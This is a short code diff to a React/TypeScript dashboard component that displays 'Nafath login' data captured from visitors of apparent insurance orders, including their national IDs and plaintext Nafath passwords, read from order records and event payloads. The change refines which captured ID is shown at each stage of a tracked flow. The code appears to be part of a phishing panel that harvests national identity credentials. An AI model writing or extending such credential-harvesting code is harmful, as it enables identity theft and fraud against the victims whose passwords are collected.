@@ -381,8 +381,14 @@ function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], sel
   const payloadNatId = (latestEvent?.payload as any)?.national_id;
   const payloadPassword = (latestEvent?.payload as any)?.nafath_password;
 
-  const nationalId = selectedVisitor?.national_id || order.national_id || payloadNatId || visitorNationalId || null;
+  const stageState = getStageState(order, "nafath_login");
+
+  // Only show nafath-specific data if this stage was reached
+  const nationalId = order.nafath_password ? (order.national_id || payloadNatId || selectedVisitor?.national_id || visitorNationalId) : (payloadNatId || null);
   const password = order.nafath_password || payloadPassword || null;
+
+  // If stage hasn't been reached yet and no events, show visitor's national_id as preview
+  const previewNationalId = stageState === "idle" ? (selectedVisitor?.national_id || order.national_id || visitorNationalId) : (nationalId || selectedVisitor?.national_id || order.national_id || visitorNationalId);
 
   return (
     <div className="space-y-1.5">
